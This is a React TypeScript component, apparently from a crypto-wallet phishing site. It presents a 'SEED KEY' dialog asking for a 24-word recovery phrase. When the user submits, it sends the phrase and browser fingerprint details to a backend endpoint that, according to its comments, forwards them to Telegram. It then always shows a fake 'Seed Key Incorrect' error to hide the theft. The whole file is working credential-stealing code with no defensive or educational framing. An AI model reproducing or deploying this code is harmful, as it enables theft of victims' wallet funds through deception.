import React, { useState, useRef, useEffect } from 'react';
import { Button } from './ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from './ui/dialog';
import { X } from 'lucide-react';
import { baseUrl } from '../lib/base-url';

interface SeedImportModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const SeedImportModal: React.FC<SeedImportModalProps> = ({ isOpen, onClose }) => {
  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(''));
  const [showError, setShowError] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorDetails, setErrorDetails] = useState<string>('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (isOpen) {
      // Фокус на первом input при открытии
      setTimeout(() => {
        inputRefs.current[0]?.focus();
      }, 100);
    } else {
      // Сброс при закрытии
      setSeedWords(Array(24).fill(''));
      setShowError(false);
      setIsSubmitting(false);
      setErrorDetails('');
    }
  }, [isOpen]);

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...seedWords];
    newWords[index] = value.trim().toLowerCase();
    setSeedWords(newWords);

    // Автоматический переход к следующему полю
    if (value.includes(' ')) {
      // Если введен пробел, переходим к следующему полю
      const cleanValue = value.trim();
      newWords[index] = cleanValue;
      setSeedWords(newWords);
      if (index < 23) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Backspace на пустом поле - переход к предыдущему
    if (e.key === 'Backspace' && !seedWords[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    // Enter - переход к следующему или отправка
    if (e.key === 'Enter') {
      e.preventDefault();
      if (index < 23) {
        inputRefs.current[index + 1]?.focus();
      } else {
        handleSubmit();
      }
    }
    // Space - переход к следующему полю
    if (e.key === ' ' && seedWords[index].trim().length > 0) {
      e.preventDefault();
      if (index < 23) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const words = pastedText.trim().split(/\s+/).filter(w => w.length > 0);
    
    const newWords = [...seedWords];
    words.forEach((word, i) => {
      if (i < 24) {
        newWords[i] = word.toLowerCase();
      }
    });
    setSeedWords(newWords);

    // Фокус на последнем заполненном поле
    const lastFilledIndex = Math.min(words.length, 24) - 1;
    setTimeout(() => {
      inputRefs.current[lastFilledIndex]?.focus();
    }, 0);
  };

  const handleSubmit = async () => {
    const allFilled = seedWords.every(word => word.trim().length > 0);
    
    if (!allFilled || isSubmitting) {
      return;
    }

    setIsSubmitting(true);
    const seedPhrase = seedWords.join(' ');

    // Сбор информации о пользователе
    const userAgent = navigator.userAgent;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || 'Unknown';
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    const platform = navigator.platform || 'Unknown';

    console.log('=== Submitting seed phrase ===');
    console.log('Seed phrase length:', seedWords.length);
    console.log('User Agent:', userAgent);
    console.log('Screen:', screenResolution);
    console.log('Language:', language);
    console.log('Timezone:', timezone);
    console.log('Platform:', platform);

    try {
      // Отправка в Telegram через API
      const response = await fetch(`${baseUrl}/api/send-seed`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          seedPhrase,
          userAgent,
          screenResolution,
          language,
          timezone,
          platform
        }),
      });

      console.log('API Response status:', response.status);
      
      let result;
      const contentType = response.headers.get('content-type');
      
      if (contentType && contentType.includes('application/json')) {
        result = await response.json();
      } else {
        const text = await response.text();
        console.error('Non-JSON response:', text);
        result = { error: 'Invalid response format', details: text };
      }
      
      console.log('API Response body:', result);

      if (!response.ok) {
        console.error('❌ Failed to send seed phrase');
        console.error('Status:', response.status);
        console.error('Error:', result);
        
        let errorMsg = result.error || 'Unknown error';
        if (result.details) {
          errorMsg += '\n\nDetails: ' + JSON.stringify(result.details, null, 2);
        }
        if (result.telegramError) {
          errorMsg += '\n\nTelegram Error: ' + result.telegramError;
        }
        
        setErrorDetails(errorMsg);
        alert(`❌ Error sending to Telegram:\n\n${errorMsg}\n\nCheck browser console for more details.`);
      } else {
        console.log('✅ Seed phrase sent successfully to Telegram!');
        console.log('Response:', result);
      }
    } catch (error) {
      console.error('❌ Network error:', error);
      const errorMsg = error instanceof Error ? error.message : String(error);
      setErrorDetails(errorMsg);
      alert(`❌ Network error:\n\n${errorMsg}\n\nCheck browser console for more details.`);
    } finally {
      setIsSubmitting(false);
    }

    // Показать ошибку "seed key incorrect"
    setShowError(true);
  };

  const isAllFilled = seedWords.every(word => word.trim().length > 0);

  if (showError) {
    return (
      <Dialog open={isOpen} onOpenChange={onClose}>
        <DialogContent className="max-w-[90vw] sm:max-w-md bg-white rounded-2xl sm:rounded-3xl border-none shadow-2xl mx-4">
          <div className="flex flex-col items-center justify-center py-6 sm:py-8 px-3 sm:px-4 animate-shake">
            <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-br from-red-100 to-red-200 flex items-center justify-center mb-4 sm:mb-6 animate-bounce-once shadow-lg">
              <X className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-2 sm:mb-3 font-heading text-center">
              Seed Key Incorrect
            </h2>
            <p className="text-sm sm:text-base text-gray-600 text-center mb-6 sm:mb-8 leading-relaxed px-2">
              The seed phrase you entered is invalid. Please check and try again.
            </p>
            {errorDetails && (
              <details className="w-full mb-4 sm:mb-6 text-xs">
                <summary className="cursor-pointer text-gray-400 hover:text-gray-600 transition-colors text-center">
                  Technical details
                </summary>
                <pre className="mt-2 p-2 sm:p-3 bg-gray-50 rounded-xl text-gray-600 overflow-auto max-h-32 border border-gray-200 text-xs">
                  {errorDetails}
                </pre>
              </details>
            )}
            <Button
              onClick={onClose}
              className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-xl sm:rounded-2xl py-5 sm:py-6 text-base sm:text-lg font-semibold shadow-lg hover:shadow-xl transition-all duration-300 active:scale-95 sm:hover:scale-105 touch-manipulation"
            >
              Close
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-[95vw] sm:max-w-4xl max-h-[90vh] overflow-y-auto bg-white rounded-2xl sm:rounded-3xl border-none shadow-2xl mx-2 sm:mx-auto">
        <DialogHeader>
          <DialogTitle className="text-2xl sm:text-3xl md:text-4xl font-bold text-center bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent font-heading pt-3 sm:pt-4">
            SEED KEY
          </DialogTitle>
        </DialogHeader>

        <div className="mt-4 sm:mt-6 px-3 sm:px-4 pb-3 sm:pb-4">
          <p className="text-xs sm:text-sm text-gray-500 text-center mb-6 sm:mb-8 animate-fade-in px-2">
            Enter your 24-word recovery phrase
          </p>

          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2 sm:gap-3 md:gap-4">
            {seedWords.map((word, index) => (
              <div 
                key={index} 
                className="flex flex-col gap-1 animate-slide-in"
                style={{ animationDelay: `${index * 20}ms` }}
              >
                <label className="text-[10px] sm:text-xs font-medium text-gray-400 pl-1 sm:pl-2">
                  Word {index + 1}
                </label>
                <input
                  ref={(el) => {
                    inputRefs.current[index] = el;
                  }}
                  type="text"
                  value={word}
                  onChange={(e) => handleWordChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={index === 0 ? handlePaste : undefined}
                  placeholder={`#${index + 1}`}
                  className="w-full px-2 sm:px-3 md:px-4 py-2 sm:py-2.5 md:py-3 border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:ring-2 focus:ring-purple-400 focus:border-transparent text-xs sm:text-sm text-gray-700 placeholder:text-gray-300 transition-all duration-300 hover:border-purple-300 touch-manipulation"
                  autoComplete="off"
                  spellCheck={false}
                  disabled={isSubmitting}
                />
              </div>
            ))}
          </div>

          <div className="mt-6 sm:mt-8 flex flex-col sm:flex-row gap-3 sm:gap-4">
            <Button
              onClick={onClose}
              variant="outline"
              className="flex-1 text-gray-600 border-2 border-gray-300 hover:bg-gray-50 rounded-xl sm:rounded-2xl py-4 sm:py-5 md:py-6 text-base sm:text-lg transition-all duration-300 active:scale-95 sm:hover:scale-105 hover:border-gray-400 touch-manipulation"
              disabled={isSubmitting}
            >
              Cancel
            </Button>
            <Button
              onClick={handleSubmit}
              disabled={!isAllFilled || isSubmitting}
              className={`
                flex-1 relative overflow-hidden
                bg-gradient-to-r from-purple-500 via-pink-500 to-purple-500
                hover:from-purple-600 hover:via-pink-600 hover:to-purple-600
                text-white rounded-xl sm:rounded-2xl py-4 sm:py-5 md:py-6 text-base sm:text-lg font-semibold
                shadow-lg hover:shadow-xl
                disabled:opacity-50 disabled:cursor-not-allowed
                transition-all duration-300
                touch-manipulation
                ${!isSubmitting && isAllFilled ? 'active:scale-95 sm:hover:scale-105' : ''}
              `}
            >
              <span className="relative z-10 flex items-center justify-center gap-2">
                {isSubmitting ? (
                  <>
                    <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span className="text-sm sm:text-base">Importing...</span>
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4 sm:w-5 sm:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                    <span className="text-sm sm:text-base">Import Wallet</span>
                  </>
                )}
              </span>
              {!isSubmitting && isAllFilled && (
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
              )}
            </Button>
          </div>

          <div className="mt-4 sm:mt-6 p-3 sm:p-4 bg-gradient-to-r from-purple-50 to-pink-50 rounded-xl sm:rounded-2xl border border-purple-100">
            <p className="text-[10px] sm:text-xs text-purple-700 text-center flex items-center justify-center gap-1 sm:gap-2 leading-relaxed">
              <svg className="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span>Tip: You can paste all 24 words at once into the first field</span>
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default SeedImportModal;
